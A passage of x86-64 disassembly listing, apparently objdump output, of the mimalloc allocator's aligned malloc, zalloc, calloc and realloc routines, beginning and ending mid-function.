  403d2d:	0f 87 9d 00 00 00    	ja     403dd0 <mi_heap_malloc_zero_aligned_at_generic+0xb0>
  403d33:	41 57                	push   %r15
  403d35:	41 56                	push   %r14
  403d37:	49 89 ce             	mov    %rcx,%r14
  403d3a:	41 55                	push   %r13
  403d3c:	49 89 d5             	mov    %rdx,%r13
  403d3f:	41 54                	push   %r12
  403d41:	49 89 f4             	mov    %rsi,%r12
  403d44:	55                   	push   %rbp
  403d45:	48 89 fd             	mov    %rdi,%rbp
  403d48:	53                   	push   %rbx
  403d49:	41 0f b6 d8          	movzbl %r8b,%ebx
  403d4d:	48 83 ec 08          	sub    $0x8,%rsp
  403d51:	48 85 c9             	test   %rcx,%rcx
  403d54:	75 05                	jne    403d5b <mi_heap_malloc_zero_aligned_at_generic+0x3b>
  403d56:	48 39 d6             	cmp    %rdx,%rsi
  403d59:	73 25                	jae    403d80 <mi_heap_malloc_zero_aligned_at_generic+0x60>
  403d5b:	48 83 c4 08          	add    $0x8,%rsp
  403d5f:	41 89 d8             	mov    %ebx,%r8d
  403d62:	4c 89 f1             	mov    %r14,%rcx
  403d65:	4c 89 ea             	mov    %r13,%rdx
  403d68:	5b                   	pop    %rbx
  403d69:	4c 89 e6             	mov    %r12,%rsi
  403d6c:	48 89 ef             	mov    %rbp,%rdi
  403d6f:	5d                   	pop    %rbp
  403d70:	41 5c                	pop    %r12
  403d72:	41 5d                	pop    %r13
  403d74:	41 5e                	pop    %r14
  403d76:	41 5f                	pop    %r15
  403d78:	e9 73 fe ff ff       	jmpq   403bf0 <mi_heap_malloc_zero_aligned_at_overalloc>
  403d7d:	0f 1f 00             	nopl   (%rax)
  403d80:	48 83 fa 10          	cmp    $0x10,%rdx
  403d84:	77 2a                	ja     403db0 <mi_heap_malloc_zero_aligned_at_generic+0x90>
  403d86:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
  403d8a:	89 da                	mov    %ebx,%edx
  403d8c:	4c 89 e6             	mov    %r12,%rsi
  403d8f:	48 89 ef             	mov    %rbp,%rdi
  403d92:	e8 79 e5 ff ff       	callq  402310 <_mi_heap_malloc_zero>
  403d97:	4c 85 f8             	test   %r15,%rax
  403d9a:	75 3c                	jne    403dd8 <mi_heap_malloc_zero_aligned_at_generic+0xb8>
  403d9c:	48 83 c4 08          	add    $0x8,%rsp
  403da0:	5b                   	pop    %rbx
  403da1:	5d                   	pop    %rbp
  403da2:	41 5c                	pop    %r12
  403da4:	41 5d                	pop    %r13
  403da6:	41 5e                	pop    %r14
  403da8:	41 5f                	pop    %r15
  403daa:	c3                   	retq   
  403dab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403db0:	48 89 f7             	mov    %rsi,%rdi
  403db3:	e8 c8 87 00 00       	callq  40c580 <mi_good_size>
  403db8:	48 3d 00 00 01 00    	cmp    $0x10000,%rax
  403dbe:	77 9b                	ja     403d5b <mi_heap_malloc_zero_aligned_at_generic+0x3b>
  403dc0:	4d 8d 7d ff          	lea    -0x1(%r13),%r15
  403dc4:	49 85 c7             	test   %rax,%r15
  403dc7:	74 c1                	je     403d8a <mi_heap_malloc_zero_aligned_at_generic+0x6a>
  403dc9:	eb 90                	jmp    403d5b <mi_heap_malloc_zero_aligned_at_generic+0x3b>
  403dcb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403dd0:	31 c0                	xor    %eax,%eax
  403dd2:	c3                   	retq   
  403dd3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403dd8:	48 89 c7             	mov    %rax,%rdi
  403ddb:	e8 80 de ff ff       	callq  401c60 <mi_free>
  403de0:	e9 76 ff ff ff       	jmpq   403d5b <mi_heap_malloc_zero_aligned_at_generic+0x3b>
  403de5:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  403dec:	00 00 00 00 

0000000000403df0 <mi_heap_malloc_zero_aligned_at>:
  403df0:	48 85 d2             	test   %rdx,%rdx
  403df3:	74 63                	je     403e58 <mi_heap_malloc_zero_aligned_at+0x68>
  403df5:	4c 8d 4a ff          	lea    -0x1(%rdx),%r9
  403df9:	4c 85 ca             	test   %r9,%rdx
  403dfc:	75 5a                	jne    403e58 <mi_heap_malloc_zero_aligned_at+0x68>
  403dfe:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  403e05:	77 41                	ja     403e48 <mi_heap_malloc_zero_aligned_at+0x58>
  403e07:	48 39 f2             	cmp    %rsi,%rdx
  403e0a:	77 3c                	ja     403e48 <mi_heap_malloc_zero_aligned_at+0x58>
  403e0c:	48 8d 46 07          	lea    0x7(%rsi),%rax
  403e10:	48 c1 e8 03          	shr    $0x3,%rax
  403e14:	4c 8b 94 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%r10
  403e1b:	00 
  403e1c:	49 8b 42 10          	mov    0x10(%r10),%rax
  403e20:	48 85 c0             	test   %rax,%rax
  403e23:	74 23                	je     403e48 <mi_heap_malloc_zero_aligned_at+0x58>
  403e25:	48 01 c8             	add    %rcx,%rax
  403e28:	4c 85 c8             	test   %r9,%rax
  403e2b:	75 1b                	jne    403e48 <mi_heap_malloc_zero_aligned_at+0x58>
  403e2d:	48 89 f2             	mov    %rsi,%rdx
  403e30:	4c 89 d6             	mov    %r10,%rsi
  403e33:	45 84 c0             	test   %r8b,%r8b
  403e36:	74 08                	je     403e40 <mi_heap_malloc_zero_aligned_at+0x50>
  403e38:	e9 63 e3 ff ff       	jmpq   4021a0 <_mi_page_malloc_zeroed>
  403e3d:	0f 1f 00             	nopl   (%rax)
  403e40:	e9 2b e3 ff ff       	jmpq   402170 <_mi_page_malloc>
  403e45:	0f 1f 00             	nopl   (%rax)
  403e48:	45 0f b6 c0          	movzbl %r8b,%r8d
  403e4c:	e9 cf fe ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  403e51:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  403e58:	31 c0                	xor    %eax,%eax
  403e5a:	c3                   	retq   
  403e5b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000403e60 <mi_heap_realloc_zero_aligned_at.part.0>:
  403e60:	41 57                	push   %r15
  403e62:	49 89 cf             	mov    %rcx,%r15
  403e65:	41 56                	push   %r14
  403e67:	4d 89 c6             	mov    %r8,%r14
  403e6a:	41 55                	push   %r13
  403e6c:	41 54                	push   %r12
  403e6e:	49 89 f4             	mov    %rsi,%r12
  403e71:	55                   	push   %rbp
  403e72:	48 89 d5             	mov    %rdx,%rbp
  403e75:	53                   	push   %rbx
  403e76:	48 83 ec 18          	sub    $0x18,%rsp
  403e7a:	48 89 3c 24          	mov    %rdi,(%rsp)
  403e7e:	48 89 f7             	mov    %rsi,%rdi
  403e81:	44 89 4c 24 0c       	mov    %r9d,0xc(%rsp)
  403e86:	e8 35 e0 ff ff       	callq  401ec0 <mi_usable_size>
  403e8b:	48 89 c3             	mov    %rax,%rbx
  403e8e:	48 39 e8             	cmp    %rbp,%rax
  403e91:	72 75                	jb     403f08 <mi_heap_realloc_zero_aligned_at.part.0+0xa8>
  403e93:	48 d1 e8             	shr    %rax
  403e96:	48 89 d9             	mov    %rbx,%rcx
  403e99:	48 29 c1             	sub    %rax,%rcx
  403e9c:	48 39 cd             	cmp    %rcx,%rbp
  403e9f:	72 27                	jb     403ec8 <mi_heap_realloc_zero_aligned_at.part.0+0x68>
  403ea1:	4b 8d 04 34          	lea    (%r12,%r14,1),%rax
  403ea5:	31 d2                	xor    %edx,%edx
  403ea7:	4d 89 e5             	mov    %r12,%r13
  403eaa:	49 f7 f7             	div    %r15
  403ead:	48 85 d2             	test   %rdx,%rdx
  403eb0:	75 16                	jne    403ec8 <mi_heap_realloc_zero_aligned_at.part.0+0x68>
  403eb2:	48 83 c4 18          	add    $0x18,%rsp
  403eb6:	4c 89 e8             	mov    %r13,%rax
  403eb9:	5b                   	pop    %rbx
  403eba:	5d                   	pop    %rbp
  403ebb:	41 5c                	pop    %r12
  403ebd:	41 5d                	pop    %r13
  403ebf:	41 5e                	pop    %r14
  403ec1:	41 5f                	pop    %r15
  403ec3:	c3                   	retq   
  403ec4:	0f 1f 40 00          	nopl   0x0(%rax)
  403ec8:	48 8b 3c 24          	mov    (%rsp),%rdi
  403ecc:	45 31 c0             	xor    %r8d,%r8d
  403ecf:	4c 89 f1             	mov    %r14,%rcx
  403ed2:	4c 89 fa             	mov    %r15,%rdx
  403ed5:	48 89 ee             	mov    %rbp,%rsi
  403ed8:	e8 13 ff ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  403edd:	49 89 c5             	mov    %rax,%r13
  403ee0:	48 85 c0             	test   %rax,%rax
  403ee3:	74 43                	je     403f28 <mi_heap_realloc_zero_aligned_at.part.0+0xc8>
  403ee5:	48 39 eb             	cmp    %rbp,%rbx
  403ee8:	48 89 ea             	mov    %rbp,%rdx
  403eeb:	4c 89 ef             	mov    %r13,%rdi
  403eee:	4c 89 e6             	mov    %r12,%rsi
  403ef1:	48 0f 46 d3          	cmovbe %rbx,%rdx
  403ef5:	e8 a6 cf ff ff       	callq  400ea0 <memcpy@plt>
  403efa:	4c 89 e7             	mov    %r12,%rdi
  403efd:	e8 5e dd ff ff       	callq  401c60 <mi_free>
  403f02:	eb ae                	jmp    403eb2 <mi_heap_realloc_zero_aligned_at.part.0+0x52>
  403f04:	0f 1f 40 00          	nopl   0x0(%rax)
  403f08:	48 8b 3c 24          	mov    (%rsp),%rdi
  403f0c:	45 31 c0             	xor    %r8d,%r8d
  403f0f:	4c 89 f1             	mov    %r14,%rcx
  403f12:	4c 89 fa             	mov    %r15,%rdx
  403f15:	48 89 ee             	mov    %rbp,%rsi
  403f18:	e8 d3 fe ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  403f1d:	49 89 c5             	mov    %rax,%r13
  403f20:	48 85 c0             	test   %rax,%rax
  403f23:	75 0b                	jne    403f30 <mi_heap_realloc_zero_aligned_at.part.0+0xd0>
  403f25:	0f 1f 00             	nopl   (%rax)
  403f28:	45 31 ed             	xor    %r13d,%r13d
  403f2b:	eb 85                	jmp    403eb2 <mi_heap_realloc_zero_aligned_at.part.0+0x52>
  403f2d:	0f 1f 00             	nopl   (%rax)
  403f30:	80 7c 24 0c 00       	cmpb   $0x0,0xc(%rsp)
  403f35:	74 ae                	je     403ee5 <mi_heap_realloc_zero_aligned_at.part.0+0x85>
  403f37:	48 83 fb 08          	cmp    $0x8,%rbx
  403f3b:	bf 08 00 00 00       	mov    $0x8,%edi
  403f40:	48 89 ea             	mov    %rbp,%rdx
  403f43:	48 0f 43 fb          	cmovae %rbx,%rdi
  403f47:	31 f6                	xor    %esi,%esi
  403f49:	48 83 ef 08          	sub    $0x8,%rdi
  403f4d:	48 29 fa             	sub    %rdi,%rdx
  403f50:	48 01 c7             	add    %rax,%rdi
  403f53:	e8 08 cf ff ff       	callq  400e60 <memset@plt>
  403f58:	eb 8b                	jmp    403ee5 <mi_heap_realloc_zero_aligned_at.part.0+0x85>
  403f5a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000403f60 <mi_heap_malloc_aligned_at>:
  403f60:	48 85 d2             	test   %rdx,%rdx
  403f63:	74 5b                	je     403fc0 <mi_heap_malloc_aligned_at+0x60>
  403f65:	4c 8d 42 ff          	lea    -0x1(%rdx),%r8
  403f69:	4c 85 c2             	test   %r8,%rdx
  403f6c:	75 52                	jne    403fc0 <mi_heap_malloc_aligned_at+0x60>
  403f6e:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  403f75:	77 39                	ja     403fb0 <mi_heap_malloc_aligned_at+0x50>
  403f77:	48 39 d6             	cmp    %rdx,%rsi
  403f7a:	72 34                	jb     403fb0 <mi_heap_malloc_aligned_at+0x50>
  403f7c:	48 8d 46 07          	lea    0x7(%rsi),%rax
  403f80:	48 c1 e8 03          	shr    $0x3,%rax
  403f84:	4c 8b 8c c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%r9
  403f8b:	00 
  403f8c:	49 8b 41 10          	mov    0x10(%r9),%rax
  403f90:	48 85 c0             	test   %rax,%rax
  403f93:	74 1b                	je     403fb0 <mi_heap_malloc_aligned_at+0x50>
  403f95:	48 01 c8             	add    %rcx,%rax
  403f98:	4c 85 c0             	test   %r8,%rax
  403f9b:	75 13                	jne    403fb0 <mi_heap_malloc_aligned_at+0x50>
  403f9d:	48 89 f2             	mov    %rsi,%rdx
  403fa0:	4c 89 ce             	mov    %r9,%rsi
  403fa3:	e9 c8 e1 ff ff       	jmpq   402170 <_mi_page_malloc>
  403fa8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  403faf:	00 
  403fb0:	45 31 c0             	xor    %r8d,%r8d
  403fb3:	e9 68 fd ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  403fb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  403fbf:	00 
  403fc0:	31 c0                	xor    %eax,%eax
  403fc2:	c3                   	retq   
  403fc3:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  403fca:	00 00 00 00 
  403fce:	66 90                	xchg   %ax,%ax

0000000000403fd0 <mi_heap_malloc_aligned>:
  403fd0:	48 85 d2             	test   %rdx,%rdx
  403fd3:	74 53                	je     404028 <mi_heap_malloc_aligned+0x58>
  403fd5:	48 8d 4a ff          	lea    -0x1(%rdx),%rcx
  403fd9:	48 85 ca             	test   %rcx,%rdx
  403fdc:	75 4a                	jne    404028 <mi_heap_malloc_aligned+0x58>
  403fde:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  403fe5:	77 31                	ja     404018 <mi_heap_malloc_aligned+0x48>
  403fe7:	48 39 d6             	cmp    %rdx,%rsi
  403fea:	72 2c                	jb     404018 <mi_heap_malloc_aligned+0x48>
  403fec:	48 8d 46 07          	lea    0x7(%rsi),%rax
  403ff0:	48 c1 e8 03          	shr    $0x3,%rax
  403ff4:	4c 8b 84 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%r8
  403ffb:	00 
  403ffc:	49 8b 40 10          	mov    0x10(%r8),%rax
  404000:	48 85 c0             	test   %rax,%rax
  404003:	74 13                	je     404018 <mi_heap_malloc_aligned+0x48>
  404005:	48 85 c8             	test   %rcx,%rax
  404008:	75 0e                	jne    404018 <mi_heap_malloc_aligned+0x48>
  40400a:	48 89 f2             	mov    %rsi,%rdx
  40400d:	4c 89 c6             	mov    %r8,%rsi
  404010:	e9 5b e1 ff ff       	jmpq   402170 <_mi_page_malloc>
  404015:	0f 1f 00             	nopl   (%rax)
  404018:	45 31 c0             	xor    %r8d,%r8d
  40401b:	31 c9                	xor    %ecx,%ecx
  40401d:	e9 fe fc ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  404022:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  404028:	31 c0                	xor    %eax,%eax
  40402a:	c3                   	retq   
  40402b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000404030 <mi_heap_zalloc_aligned_at>:
  404030:	48 85 d2             	test   %rdx,%rdx
  404033:	74 5b                	je     404090 <mi_heap_zalloc_aligned_at+0x60>
  404035:	4c 8d 42 ff          	lea    -0x1(%rdx),%r8
  404039:	4c 85 c2             	test   %r8,%rdx
  40403c:	75 52                	jne    404090 <mi_heap_zalloc_aligned_at+0x60>
  40403e:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  404045:	77 39                	ja     404080 <mi_heap_zalloc_aligned_at+0x50>
  404047:	48 39 d6             	cmp    %rdx,%rsi
  40404a:	72 34                	jb     404080 <mi_heap_zalloc_aligned_at+0x50>
  40404c:	48 8d 46 07          	lea    0x7(%rsi),%rax
  404050:	48 c1 e8 03          	shr    $0x3,%rax
  404054:	4c 8b 8c c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%r9
  40405b:	00 
  40405c:	49 8b 41 10          	mov    0x10(%r9),%rax
  404060:	48 85 c0             	test   %rax,%rax
  404063:	74 1b                	je     404080 <mi_heap_zalloc_aligned_at+0x50>
  404065:	48 01 c8             	add    %rcx,%rax
  404068:	4c 85 c0             	test   %r8,%rax
  40406b:	75 13                	jne    404080 <mi_heap_zalloc_aligned_at+0x50>
  40406d:	48 89 f2             	mov    %rsi,%rdx
  404070:	4c 89 ce             	mov    %r9,%rsi
  404073:	e9 28 e1 ff ff       	jmpq   4021a0 <_mi_page_malloc_zeroed>
  404078:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40407f:	00 
  404080:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  404086:	e9 95 fc ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  40408b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404090:	31 c0                	xor    %eax,%eax
  404092:	c3                   	retq   
  404093:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  40409a:	00 00 00 00 
  40409e:	66 90                	xchg   %ax,%ax

00000000004040a0 <mi_heap_zalloc_aligned>:
  4040a0:	48 85 d2             	test   %rdx,%rdx
  4040a3:	74 53                	je     4040f8 <mi_heap_zalloc_aligned+0x58>
  4040a5:	48 8d 4a ff          	lea    -0x1(%rdx),%rcx
  4040a9:	48 85 ca             	test   %rcx,%rdx
  4040ac:	75 4a                	jne    4040f8 <mi_heap_zalloc_aligned+0x58>
  4040ae:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  4040b5:	77 31                	ja     4040e8 <mi_heap_zalloc_aligned+0x48>
  4040b7:	48 39 d6             	cmp    %rdx,%rsi
  4040ba:	72 2c                	jb     4040e8 <mi_heap_zalloc_aligned+0x48>
  4040bc:	48 8d 46 07          	lea    0x7(%rsi),%rax
  4040c0:	48 c1 e8 03          	shr    $0x3,%rax
  4040c4:	4c 8b 84 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%r8
  4040cb:	00 
  4040cc:	49 8b 40 10          	mov    0x10(%r8),%rax
  4040d0:	48 85 c0             	test   %rax,%rax
  4040d3:	74 13                	je     4040e8 <mi_heap_zalloc_aligned+0x48>
  4040d5:	48 85 c8             	test   %rcx,%rax
  4040d8:	75 0e                	jne    4040e8 <mi_heap_zalloc_aligned+0x48>
  4040da:	48 89 f2             	mov    %rsi,%rdx
  4040dd:	4c 89 c6             	mov    %r8,%rsi
  4040e0:	e9 bb e0 ff ff       	jmpq   4021a0 <_mi_page_malloc_zeroed>
  4040e5:	0f 1f 00             	nopl   (%rax)
  4040e8:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4040ee:	31 c9                	xor    %ecx,%ecx
  4040f0:	e9 2b fc ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  4040f5:	0f 1f 00             	nopl   (%rax)
  4040f8:	31 c0                	xor    %eax,%eax
  4040fa:	c3                   	retq   
  4040fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000404100 <mi_heap_calloc_aligned_at>:
  404100:	49 89 ca             	mov    %rcx,%r10
  404103:	49 89 d1             	mov    %rdx,%r9
  404106:	4c 89 c1             	mov    %r8,%rcx
  404109:	48 83 fe 01          	cmp    $0x1,%rsi
  40410d:	74 0b                	je     40411a <mi_heap_calloc_aligned_at+0x1a>
  40410f:	48 89 f0             	mov    %rsi,%rax
  404112:	49 f7 e1             	mul    %r9
  404115:	49 89 c1             	mov    %rax,%r9
  404118:	70 46                	jo     404160 <mi_heap_calloc_aligned_at+0x60>
  40411a:	4d 85 d2             	test   %r10,%r10
  40411d:	74 41                	je     404160 <mi_heap_calloc_aligned_at+0x60>
  40411f:	49 8d 52 ff          	lea    -0x1(%r10),%rdx
  404123:	49 85 d2             	test   %rdx,%r10
  404126:	75 38                	jne    404160 <mi_heap_calloc_aligned_at+0x60>
  404128:	49 81 f9 00 04 00 00 	cmp    $0x400,%r9
  40412f:	77 37                	ja     404168 <mi_heap_calloc_aligned_at+0x68>
  404131:	4d 39 d1             	cmp    %r10,%r9
  404134:	72 32                	jb     404168 <mi_heap_calloc_aligned_at+0x68>
  404136:	49 8d 41 07          	lea    0x7(%r9),%rax
  40413a:	48 c1 e8 03          	shr    $0x3,%rax
  40413e:	48 8b b4 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rsi
  404145:	00 
  404146:	48 8b 46 10          	mov    0x10(%rsi),%rax
  40414a:	48 85 c0             	test   %rax,%rax
  40414d:	74 19                	je     404168 <mi_heap_calloc_aligned_at+0x68>
  40414f:	48 01 c8             	add    %rcx,%rax
  404152:	48 85 d0             	test   %rdx,%rax
  404155:	75 11                	jne    404168 <mi_heap_calloc_aligned_at+0x68>
  404157:	4c 89 ca             	mov    %r9,%rdx
  40415a:	e9 41 e0 ff ff       	jmpq   4021a0 <_mi_page_malloc_zeroed>
  40415f:	90                   	nop
  404160:	31 c0                	xor    %eax,%eax
  404162:	c3                   	retq   
  404163:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404168:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40416e:	4c 89 d2             	mov    %r10,%rdx
  404171:	4c 89 ce             	mov    %r9,%rsi
  404174:	e9 a7 fb ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  404179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000404180 <mi_heap_calloc_aligned>:
  404180:	49 89 d1             	mov    %rdx,%r9
  404183:	49 89 ca             	mov    %rcx,%r10
  404186:	48 83 fe 01          	cmp    $0x1,%rsi
  40418a:	74 0b                	je     404197 <mi_heap_calloc_aligned+0x17>
  40418c:	48 89 f0             	mov    %rsi,%rax
  40418f:	49 f7 e1             	mul    %r9
  404192:	49 89 c1             	mov    %rax,%r9
  404195:	70 49                	jo     4041e0 <mi_heap_calloc_aligned+0x60>
  404197:	4d 85 d2             	test   %r10,%r10
  40419a:	74 44                	je     4041e0 <mi_heap_calloc_aligned+0x60>
  40419c:	49 8d 52 ff          	lea    -0x1(%r10),%rdx
  4041a0:	49 85 d2             	test   %rdx,%r10
  4041a3:	75 3b                	jne    4041e0 <mi_heap_calloc_aligned+0x60>
  4041a5:	49 81 f9 00 04 00 00 	cmp    $0x400,%r9
  4041ac:	77 3a                	ja     4041e8 <mi_heap_calloc_aligned+0x68>
  4041ae:	4d 39 ca             	cmp    %r9,%r10
  4041b1:	77 35                	ja     4041e8 <mi_heap_calloc_aligned+0x68>
  4041b3:	49 8d 41 07          	lea    0x7(%r9),%rax
  4041b7:	48 c1 e8 03          	shr    $0x3,%rax
  4041bb:	48 8b b4 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rsi
  4041c2:	00 
  4041c3:	48 8b 46 10          	mov    0x10(%rsi),%rax
  4041c7:	48 85 c0             	test   %rax,%rax
  4041ca:	74 1c                	je     4041e8 <mi_heap_calloc_aligned+0x68>
  4041cc:	48 85 d0             	test   %rdx,%rax
  4041cf:	75 17                	jne    4041e8 <mi_heap_calloc_aligned+0x68>
  4041d1:	4c 89 ca             	mov    %r9,%rdx
  4041d4:	e9 c7 df ff ff       	jmpq   4021a0 <_mi_page_malloc_zeroed>
  4041d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4041e0:	31 c0                	xor    %eax,%eax
  4041e2:	c3                   	retq   
  4041e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4041e8:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4041ee:	31 c9                	xor    %ecx,%ecx
  4041f0:	4c 89 d2             	mov    %r10,%rdx
  4041f3:	4c 89 ce             	mov    %r9,%rsi
  4041f6:	e9 25 fb ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  4041fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000404200 <mi_malloc_aligned_at>:
  404200:	48 89 f8             	mov    %rdi,%rax
  404203:	48 85 f6             	test   %rsi,%rsi
  404206:	74 68                	je     404270 <mi_malloc_aligned_at+0x70>
  404208:	4c 8d 4e ff          	lea    -0x1(%rsi),%r9
  40420c:	4c 85 ce             	test   %r9,%rsi
  40420f:	75 5f                	jne    404270 <mi_malloc_aligned_at+0x70>
  404211:	48 c7 c1 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rcx
  404218:	64 48 8b 39          	mov    %fs:(%rcx),%rdi
  40421c:	48 3d 00 04 00 00    	cmp    $0x400,%rax
  404222:	77 34                	ja     404258 <mi_malloc_aligned_at+0x58>
  404224:	48 39 f0             	cmp    %rsi,%rax
  404227:	72 2f                	jb     404258 <mi_malloc_aligned_at+0x58>
  404229:	4c 8d 40 07          	lea    0x7(%rax),%r8
  40422d:	49 c1 e8 03          	shr    $0x3,%r8
  404231:	4e 8b 94 c7 f8 00 00 	mov    0xf8(%rdi,%r8,8),%r10
  404238:	00 
  404239:	4d 8b 42 10          	mov    0x10(%r10),%r8
  40423d:	4d 85 c0             	test   %r8,%r8
  404240:	74 16                	je     404258 <mi_malloc_aligned_at+0x58>
  404242:	49 01 d0             	add    %rdx,%r8
  404245:	4d 85 c8             	test   %r9,%r8
  404248:	75 0e                	jne    404258 <mi_malloc_aligned_at+0x58>
  40424a:	48 89 c2             	mov    %rax,%rdx
  40424d:	4c 89 d6             	mov    %r10,%rsi
  404250:	e9 1b df ff ff       	jmpq   402170 <_mi_page_malloc>
  404255:	0f 1f 00             	nopl   (%rax)
  404258:	48 89 d1             	mov    %rdx,%rcx
  40425b:	45 31 c0             	xor    %r8d,%r8d
  40425e:	48 89 f2             	mov    %rsi,%rdx
  404261:	48 89 c6             	mov    %rax,%rsi
  404264:	e9 b7 fa ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  404269:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  404270:	31 c0                	xor    %eax,%eax
  404272:	c3                   	retq   
  404273:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  40427a:	00 00 00 00 
  40427e:	66 90                	xchg   %ax,%ax

0000000000404280 <mi_malloc_aligned>:
  404280:	48 89 f8             	mov    %rdi,%rax
  404283:	48 89 f2             	mov    %rsi,%rdx
  404286:	48 85 f6             	test   %rsi,%rsi
  404289:	74 5d                	je     4042e8 <mi_malloc_aligned+0x68>
  40428b:	4c 8d 46 ff          	lea    -0x1(%rsi),%r8
  40428f:	4c 85 c6             	test   %r8,%rsi
  404292:	75 54                	jne    4042e8 <mi_malloc_aligned+0x68>
  404294:	48 c7 c1 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rcx
  40429b:	64 48 8b 39          	mov    %fs:(%rcx),%rdi
  40429f:	48 3d 00 04 00 00    	cmp    $0x400,%rax
  4042a5:	77 31                	ja     4042d8 <mi_malloc_aligned+0x58>
  4042a7:	48 39 f0             	cmp    %rsi,%rax
  4042aa:	72 2c                	jb     4042d8 <mi_malloc_aligned+0x58>
  4042ac:	48 8d 48 07          	lea    0x7(%rax),%rcx
  4042b0:	48 c1 e9 03          	shr    $0x3,%rcx
  4042b4:	48 8b b4 cf f8 00 00 	mov    0xf8(%rdi,%rcx,8),%rsi
  4042bb:	00 
  4042bc:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  4042c0:	48 85 c9             	test   %rcx,%rcx
  4042c3:	74 13                	je     4042d8 <mi_malloc_aligned+0x58>
  4042c5:	4c 85 c1             	test   %r8,%rcx
  4042c8:	75 0e                	jne    4042d8 <mi_malloc_aligned+0x58>
  4042ca:	48 89 c2             	mov    %rax,%rdx
  4042cd:	e9 9e de ff ff       	jmpq   402170 <_mi_page_malloc>
  4042d2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4042d8:	45 31 c0             	xor    %r8d,%r8d
  4042db:	31 c9                	xor    %ecx,%ecx
  4042dd:	48 89 c6             	mov    %rax,%rsi
  4042e0:	e9 3b fa ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  4042e5:	0f 1f 00             	nopl   (%rax)
  4042e8:	31 c0                	xor    %eax,%eax
  4042ea:	c3                   	retq   
  4042eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000004042f0 <mi_zalloc_aligned_at>:
  4042f0:	48 89 f8             	mov    %rdi,%rax
  4042f3:	48 85 f6             	test   %rsi,%rsi
  4042f6:	74 68                	je     404360 <mi_zalloc_aligned_at+0x70>
  4042f8:	4c 8d 4e ff          	lea    -0x1(%rsi),%r9
  4042fc:	4c 85 ce             	test   %r9,%rsi
  4042ff:	75 5f                	jne    404360 <mi_zalloc_aligned_at+0x70>
  404301:	48 c7 c1 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rcx
  404308:	64 48 8b 39          	mov    %fs:(%rcx),%rdi
  40430c:	48 3d 00 04 00 00    	cmp    $0x400,%rax
  404312:	77 34                	ja     404348 <mi_zalloc_aligned_at+0x58>
  404314:	48 39 f0             	cmp    %rsi,%rax
  404317:	72 2f                	jb     404348 <mi_zalloc_aligned_at+0x58>
  404319:	4c 8d 40 07          	lea    0x7(%rax),%r8
  40431d:	49 c1 e8 03          	shr    $0x3,%r8
  404321:	4e 8b 94 c7 f8 00 00 	mov    0xf8(%rdi,%r8,8),%r10
  404328:	00 
  404329:	4d 8b 42 10          	mov    0x10(%r10),%r8
  40432d:	4d 85 c0             	test   %r8,%r8
  404330:	74 16                	je     404348 <mi_zalloc_aligned_at+0x58>
  404332:	49 01 d0             	add    %rdx,%r8
  404335:	4d 85 c8             	test   %r9,%r8
  404338:	75 0e                	jne    404348 <mi_zalloc_aligned_at+0x58>
